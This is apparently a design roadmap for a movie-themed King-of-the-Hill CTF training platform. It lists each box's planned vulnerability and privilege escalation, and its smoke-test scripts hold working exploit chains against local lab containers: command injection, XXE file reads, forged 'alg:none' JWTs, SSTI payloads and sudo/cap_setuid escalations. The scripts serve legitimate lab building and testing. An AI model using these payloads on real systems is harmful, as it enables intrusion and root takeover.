# KOTH - 20 Movie-Themed Challenges (design roadmap)

Goal: grow from 4 hills to **20**, themed around five franchises (4 each), each
playable as a **standalone CTF** but pluggable into the King-of-the-Hill scoring core
(beacon agent + `king.txt` + tick engine). A recurring thread: several boxes must be
**repaired before they can be captured** (low-level boot/config recovery), which adds a
sysadmin/recovery skill on top of exploitation.

Every hill keeps the house contract:
`Dockerfile` → `entrypoint.sh` (writes flags, sets `king.txt`, arms privesc) →
`server.py` (pure stdlib, port 80) → `reset.sh` (revives entry + privesc, never touches
`king.txt`) → `README.md`, plus a `flags.json` pair and a `config/hills.json` row.

Vuln classes are spread deliberately so the set teaches a broad curriculum (no more than
two boxes share an entry or a privesc).

---

## The 20 hills

| # | Hill (theme) | Franchise | Entry (foothold) | Privesc (→ root) | Repair gate? |
|---|--------------|-----------|------------------|------------------|--------------|
| 1 | NetOps Console | *(existing)* | command injection | `sudo find` | - |
| 2 | MathLab Compute | *(existing)* | unsandboxed `eval()` | SUID bash | - |
| 3 | CacheCTL Admin | *(existing)* | admin brute → console RCE | world-writable cron/hook | - |
| 4 | BuildHub CI | *(existing)* | hidden console, weak creds | `sudo tar` | - |
| **5** | **Doors of Durin** | **LOTR** | **repair boot → command injection** | **`sudo find`** | **built** |
| **6** | **Palantír of Orthanc** | **LOTR** | **XXE file read → command console** | **`sudo awk`** | **built** |
| **7** | **Barad-dûr Watchtower** | **LOTR** | **JWT `alg:none` bypass → RCE** | **cron `PATH` hijack** | **built** |
| **8** | **Isengard Forge** | **LOTR** | **weak-cred CI console → RCE** | **capability `cap_setuid`** | **built** |
| **9** | **Grid Portal (I/O Tower)** | **Tron** | **SSTI (template injection)** | **`sudo sed`** | **built** |
| **10** | **MCP Core** | **Tron** | **pickle deserialization RCE** | **SUID `find`** | **built** |
| 11 | Light Cycle Arena | Tron | unauth debug API → RCE | writable `.service` file | - |
| 12 | Flynn's Arcade | Tron | LFI + log poisoning → RCE | `sudo`/PATH in root cron | repair (VM: grub) |
| 13 | RDA Ops Console | Avatar | command injection | `sudo tar`/`find` | - |
| **14** | **Avatar Link Unit** | **Avatar** | **SQLi auth bypass → console RCE** | **`sudo perl`** | **built** |
| 15 | Eywa Network | Avatar | SSRF → internal creds → RCE | exposed Docker socket | - |
| 16 | Unobtainium Refinery | Avatar | repair mount/config → `eval` RCE | writable `/etc/passwd` | repair |
| **17** | **Hogwarts Portal** | **Harry Potter** | **SSTI ("spells") → RCE** | **`sudo python3`** | **built** |
| 18 | Gringotts Vault | Harry Potter | repair DB → deserialization RCE | writable `sudoers.d` | repair |
| **19** | **Ministry of Magic** | **Harry Potter** | **SSRF + LFI → RCE** | **root cron (writable jobs)** | **built** |
| 20 | Room of Requirement | Harry Potter | hidden ("Marauder's Map") debug → RCE | `cap_setuid`/PATH | repair (VM: emergency mode) |

*(Erebor/Smaug/Hobbit note: if you prefer 5 distinct franchises over 4-per, swap one
Avatar or LOTR slot for a Hobbit set - e.g. **Bag End** (upload → webshell / writable
cron), **Erebor Vault** (IDOR + SSTI / `cap_setuid`), **Smaug's Hoard** (repair sealed
gate → RCE / NFS `no_root_squash`), **Laketown Exchange** (SQLi → SSH / `sudo` env). The
table stays the same shape.)*

---

## The "repair-to-capture" pattern (the interesting thread)

A repair-gated hill boots **degraded**: the entry vuln is dormant until the attacker
fixes a low-level fault. Three fidelity levels, pick per hill:

1. **Simulated boot (container-friendly, runs in the docker demo).** A rescue console
   exposes a corrupted `grub.cfg`/`fstab`-style record; a correct edit "boots" the box
   and starts the vulnerable service. **Hill-5 uses this** (`durin.cfg`: fix `root=`,
   supply `passphrase="mellon"`, `boot=on`). This is the recommended default because it
   works everywhere `docker compose` does.
2. **Service-level repair (container-friendly).** The box is up but the service is
   crash-looping on a broken config / wrong permissions / full disk / failed DB
   migration. The attacker fixes it (often *with* a flaw that lets an unauth user do so)
   to bring the vuln online. Good for hills 10, 16, 18.
3. **Real low-level repair (VM only).** Ship a genuinely broken `/boot/grub/grub.cfg`
   or bad `/etc/fstab` UUID that drops the VM into emergency mode; the attacker fixes it
   from the console (GRUB edit, `mount -o remount,rw /`, correct the UUID) before SSH/the
   service comes up. Wire this into `deploy/setup-hill.sh`. Good for hills 12, 20.

### KOTH semantics for a repair gate
- The repair **is the entry challenge**. On `reset.sh`, re-break it (as hill-5 does) so a
  scheduled/green-team reset forces the next attacker to re-repair - this is exactly the
  "entry vuln restored on a schedule" rule the platform already relies on.
- Never let repair touch `king.txt`. Holding still means defending `king.txt`; the twist
  is that a reset also knocks the box back to *needs-repair*, so defenders must keep it
  booted **and** guard root.
- Keep the repair writable by the foothold user only where the puzzle requires it (hill-5
  makes `/opt/boot` group-writable by `moria` so the rescue console can rewrite the
  record). Never expose the HMAC key or host paths to the box.

---

## Standalone-CTF vs hill mode

Each box is a self-contained vulnerable service, so it already runs as a classic
jeopardy-style CTF (just `docker compose up` and hunt `user.txt`/`root.txt`). To plug it
into KOTH you add exactly three things - no code change to the box:

1. a `flags.json` pair (`user` + `root`),
2. a `config/hills.json` row (id, SLA probe host/port, per-hill `hmac_key`, url),
3. the host-side beacon agent reading that box's `/root/king.txt`
   (`KOTH_READ_CMD="docker exec koth-hill-N cat /root/king.txt"`).

So "make each one its own CTF but connectable to a hill" is already the architecture - the roadmap just fills in 15 more boxes.

---

## Build order (suggested)

1. **hill-5 Doors of Durin** - done, reference implementation of the repair gate.
2. Non-repair variety first to broaden the curriculum: **9 (SSTI)**, **14 (SQLi)**,
   **6 (XXE)**, **15 (SSRF/Docker sock)** - each introduces a new vuln class.
3. Then the repair-gated set reusing the hill-5 pattern: **16, 18, 10**, and the
   VM-level ones **12, 20**.
4. Fill remaining themed slots: **7 (JWT)**, **11 (unauth API)**, **8 (CI)**,
   **13 (cmd inj)**, **17 (SSTI)**, **19 (SSRF+LFI)**.

Each new hill = copy a sibling directory, swap the themed `server.py` + flags + privesc,
add the `flags.json`/`hills.json` rows, and extend `deploy/smoke-test.sh` with a
`hN_user/hN_root/hN_king` trio.

---

## Wiring in hill-5 (ready to paste)

**`flags/flags.json`** - append:

```json
  {
    "flag_id": "hill-5-user",
    "hill_id": "hill-5",
    "kind": "user",
    "flag": "CTF{sp34k_fr13nd_4nd_3nt3r_m0r14}"
  },
  {
    "flag_id": "hill-5-root",
    "hill_id": "hill-5",
    "kind": "root",
    "flag": "CTF{sud0_f1nd_1n_th3_d33p_pl4c3s}"
  }
```

**`config/hills.json`** - add a row:

```json
  {"id":"hill-5","name":"Doors of Durin","service_host":"127.0.0.1","service_port":8085,"hmac_key":"changeme-hill-5","url":"http://localhost:8085"}
```

**`deploy/smoke-test.sh`** - add extractors (note the repair step first) and include `5`
in the loop:

```sh
h5_boot(){ curl -s -X POST http://127.0.0.1:8085/rescue --data-urlencode \
  'cfg=set root=(hd0,gpt1)
set passphrase="mellon"
set boot=on' >/dev/null; }
h5_user(){ h5_boot; curl -s -G http://127.0.0.1:8085/mine --data-urlencode 'q=x; cat /home/moria/user.txt' | grep -o 'CTF{[^}]*}'; }
h5_root(){ h5_boot; curl -s -G http://127.0.0.1:8085/mine --data-urlencode 'q=x; sudo find /etc/hostname -exec cat /root/root.txt \;' | grep -o 'CTF{[^}]*}'; }
h5_king(){ h5_boot; curl -s -G http://127.0.0.1:8085/mine --data-urlencode "q=x; sudo find /etc/hostname -exec sh -c \"echo $TOKEN > /root/king.txt\" \;" >/dev/null;
           curl -s -G http://127.0.0.1:8085/mine --data-urlencode 'q=x; sudo find /etc/hostname -exec cat /root/king.txt \;' | grep -o 'TOK-[A-Za-z0-9-]*'; }
```

Then in `uf()`/`rf()` add: `5) echo 'CTF{sp34k_fr13nd_4nd_3nt3r_m0r14}';;` and
`5) echo 'CTF{sud0_f1nd_1n_th3_d33p_pl4c3s}';;`, and change the loop to `for n in 1 2 3 4 5`.

## Wiring in hills 6-9 (smoke-test extractors, ready to paste)

`flags/flags.json` and `config/hills.json` are already updated for hills 5-9. To extend
`deploy/smoke-test.sh`, add these extractors and include `6 7 8 9` in the capture loop
(hill-5's snippet is above):

```sh
# hill-6 Palantir: XXE -> key -> command console -> sudo awk
h6_xxe(){ curl -s -X POST http://127.0.0.1:8086/scry --data-binary \
  "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file://$1\">]><vision>&x;</vision>"; }
h6_user(){ h6_xxe /home/palantir/user.txt | grep -o 'CTF{[^}]*}'; }
h6_key(){ h6_xxe /opt/app/palantir.key | tr -d '\n'; }
h6_root(){ curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$(h6_key)" \
  --data-urlencode "cmd=sudo awk 'BEGIN{system(\"cat /root/root.txt\")}' /dev/null" | grep -o 'CTF{[^}]*}'; }
h6_king(){ curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$(h6_key)" \
  --data-urlencode "cmd=sudo awk 'BEGIN{system(\"echo $TOKEN > /root/king.txt\")}' /dev/null" >/dev/null;
  curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$(h6_key)" \
  --data-urlencode "cmd=sudo awk 'BEGIN{system(\"cat /root/king.txt\")}' /dev/null" | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-7 Barad-dur: forge alg:none admin token; PATH-hijack privesc (needs ~5s for the loop)
h7_tok(){ python3 -c 'import base64,json;e=lambda b:base64.urlsafe_b64encode(b).decode().rstrip("=");print(e(b"{\"alg\":\"none\",\"typ\":\"JWT\"}")+"."+e(b"{\"user\":\"sauron\",\"role\":\"admin\"}")+".")'; }
h7_exec(){ curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$(h7_tok)" --data-urlencode "cmd=$1"; }
h7_user(){ h7_exec 'cat /home/watch/user.txt' | grep -o 'CTF{[^}]*}'; }
h7_root(){ h7_exec 'printf "#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n" > /opt/watchbin/keeper; chmod 755 /opt/watchbin/keeper' >/dev/null; sleep 5; h7_exec 'cat /tmp/r' | grep -o 'CTF{[^}]*}'; }
h7_king(){ h7_exec "printf '#!/bin/sh\necho $TOKEN > /root/king.txt\n' > /opt/watchbin/keeper; chmod 755 /opt/watchbin/keeper" >/dev/null; sleep 5; h7_exec 'cat /root/king.txt' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-8 Isengard: weak creds -> build RCE -> cap_setuid via forgepy
h8_c(){ curl -s -i -X POST -d 'user=saruman&password=isengard' http://127.0.0.1:8088/forge/login | grep -i set-cookie | sed 's/.*forge=//; s/;.*//' | tr -d '\r'; }
h8_run(){ curl -s -X POST -b "forge=$(h8_c)" --data-urlencode "script=$1" http://127.0.0.1:8088/forge/run; }
h8_user(){ h8_run 'cat /home/orc/user.txt' | grep -o 'CTF{[^}]*}'; }
h8_root(){ h8_run 'forgepy -c "import os;os.setuid(0);os.system(\"cat /root/root.txt\")"' | grep -o 'CTF{[^}]*}'; }
h8_king(){ h8_run "forgepy -c \"import os;os.setuid(0);os.system('echo $TOKEN > /root/king.txt')\"" >/dev/null;
  h8_run 'forgepy -c "import os;os.setuid(0);os.system(\"cat /root/king.txt\")"' | grep -o 'TOK-[A-Za-z0-9-]*'; }

# hill-9 Grid: SSTI -> RCE -> sudo sed
h9_g(){ curl -s -G http://127.0.0.1:8089/greet --data-urlencode "name=$1"; }
h9_user(){ h9_g "{{__import__('subprocess').run(['cat','/home/program/user.txt'],capture_output=True,text=True).stdout}}" | grep -o 'CTF{[^}]*}'; }
h9_root(){ h9_g "{{__import__('subprocess').run(['sudo','sed','-n','p','/root/root.txt'],capture_output=True,text=True).stdout}}" | grep -o 'CTF{[^}]*}'; }
h9_king(){ h9_g "{{__import__('subprocess').run(['sudo','sed','-n','1e echo $TOKEN > /root/king.txt','/etc/hostname'],capture_output=True,text=True).stdout}}" >/dev/null;
  h9_g "{{__import__('subprocess').run(['sudo','sed','-n','p','/root/king.txt'],capture_output=True,text=True).stdout}}" | grep -o 'TOK-[A-Za-z0-9-]*'; }
```

Then extend `uf()`/`rf()` with the 5-9 flags and change the loop to `for n in 1 2 3 4 5 6 7 8 9`.

## Progress

Built and entry-chain-tested: **hill-5 … hill-9** (5 of the 16 new). Remaining: 10-20.
Next batch in build order: **10 MCP Core (pickle + repair)**, **11 Light Cycle Arena
(unauth API)**, **12 Flynn's Arcade (LFI + log poisoning, VM-grub repair)**,
**13 RDA Ops (cmd inj)**.
